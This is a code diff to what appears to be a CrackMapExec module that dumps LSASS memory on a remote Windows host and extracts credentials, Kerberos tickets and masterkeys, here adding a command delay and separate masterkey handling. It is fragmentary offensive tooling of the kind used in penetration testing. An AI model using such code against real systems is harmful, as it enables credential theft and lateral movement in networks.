@@ -52,7 +52,7 @@ class CMEModule:
             context.log.error("Couldn't connect to remote host")
             return False
 
-        dumper = Dumper(session, timeout=10).load(self.method)
+        dumper = Dumper(session, timeout=10, time_between_commands=7).load(self.method)
         if dumper is None:
             context.log.error("Unable to load dump method '{}'".format(self.method))
             return False
@@ -66,13 +66,13 @@ class CMEModule:
         if parsed is None:
             context.log.error("Unable to parse lsass dump")
             return False
-        credentials, tickets = parsed
+        credentials, tickets, masterkeys = parsed
 
         file.close()
         ImpacketFile.delete(session, file.get_file_path())
         if credentials is None:
             credentials = []
-        credentials = [cred.get_object() for cred in credentials if not cred.get_username().endswith("$")]
+        credentials = [cred.get_object() for cred in credentials if cred.ticket is None and cred.masterkey is None and not cred.get_username().endswith("$")]
         credentials_unique = []
         credentials_output = []
         for cred in credentials:
